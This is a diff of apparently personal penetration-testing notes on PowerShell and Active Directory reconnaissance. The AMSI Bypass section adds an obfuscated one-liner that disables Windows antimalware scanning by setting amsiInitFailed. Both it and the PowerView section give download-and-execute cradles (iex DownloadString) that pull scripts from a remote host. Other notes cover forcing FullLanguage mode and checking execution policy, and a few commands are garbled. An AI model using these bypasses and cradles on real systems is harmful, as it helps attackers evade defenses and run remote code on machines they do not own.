@@ -23,22 +23,18 @@
 &nbsp;  
 
 ## AMSI Bypass
-6. Get-ExecutionPolicy -list (make sure only unrestricted for CurrentUser)
-7. $ExecutionContext.SessionState --> Make sure LanguageMode is FullLanguage
-8.   -set $ExecutionContext.SessionState.LanguageMode = "FullLanguage"
-
-right way iex (New-Object New.WebClient).DownloadString("https://10.0.0.7/amsi/bypass.ps1")
-iex (New-Object New.WebClient).DownloadString("https:10.0.0.7/powersploit/PowerSploit-master/Recon/PowerView.ps1")
 
 1. Source 1: [S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)  
 
 2. Source 2: [reigningshells/powershell-bypasses.ps1](https://gist.github.com/reigningshells/a255fcca07465befbcbf4be9cdf67560)  
-&nbsp;&nbsp;&nbsp;&nbsp;- *This works*  
+&nbsp;&nbsp;&nbsp;&nbsp;- *This bypass works*  
 
-3. Source 3: [NullPtrStack/amsi-bypass](https://nullptrstack.github.io/amsi-bypass/)
-4. source 3 bypass has no return outut
-5. amsiinitfailed returns that it isn't the name of a cmdlet, function, etc
-&nbsp;&nbsp;&nbsp;&nbsp;- *Test with the bypass in this one*
+3. Test old bypass: ``sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]("{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )``  
+&nbsp;&nbsp;&nbsp;&nbsp;- *It should have no return output*  
+
+4. Test that `amsiinitfailed` returns that it isn't the name of a cmdlet, function, etc*
+
+5. Right way to bypass: `iex (New-Object New.WebClient).DownloadString("https://10.0.0.7/amsi/bypass.ps1")`
 
 &nbsp;  
 
@@ -66,15 +62,42 @@ iex (New-Object New.WebClient).DownloadString("https:10.0.0.7/powersploit/PowerS
 
 4. `Get-Command -Module ActiveDirectory` *won't work* and `Get-ADDomain` *will work*  
 &nbsp;  
-5. `iwr -Uri "https://github.com/samratashok/admodule/archive/master.zip" -Outfile ADModule.zip`  
+5. `iwr -Uri "https://github.com/samratashok/admodule/archive/master.zip" -Outfile ADModule.zip` or download zip  
 
 6. `Expand-archive .\ADModule.zip`  
 
-7. `cd .\ADModule-master\ActiveDirectory`
+7. `cd .\ADModule-master\ActiveDirectory`  
 
-8. `import-Module ActiveDirectory.psd1`
+8. `Import-Module ActiveDirectory.psd1`            //////////////////////////////////
 
-9. `Get-Command -Module ActiveDirectoryn   get-`  
+9. `Get-Command -Module ActiveDirectoryn   get-`  //////////////////////////////////
+
+&nbsp;  
+
+## Execution Policy and Execution Context  
+
+1. `Get-ExecutionPolicy -list`  
+&nbsp;&nbsp;&nbsp;&nbsp;- *make sure only unrestricted for CurrentUser*  
+
+2. `$ExecutionContext.SessionState`  
+&nbsp;&nbsp;&nbsp;&nbsp;- *Make sure LanguageMode is FullLanguage or do `-set $ExecutionContext.SessionState.LanguageMode = "FullLanguage"`*  
+
+&nbsp;  
+
+## PowerView  
+
+1. New PowerView: [PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
+&nbsp;&nbsp;&nbsp;&nbsp;- *Copy/paste, download zip, or git clone*  
+
+2. 
+
+Right way to download: `iex (New-Object New.WebClient).DownloadString("https:10.0.0.7/powersploit/PowerSploit-master/Recon/PowerView.ps1")`
+
+&nbsp;  
+
+## 
+
+1. 
 
 &nbsp;  
 
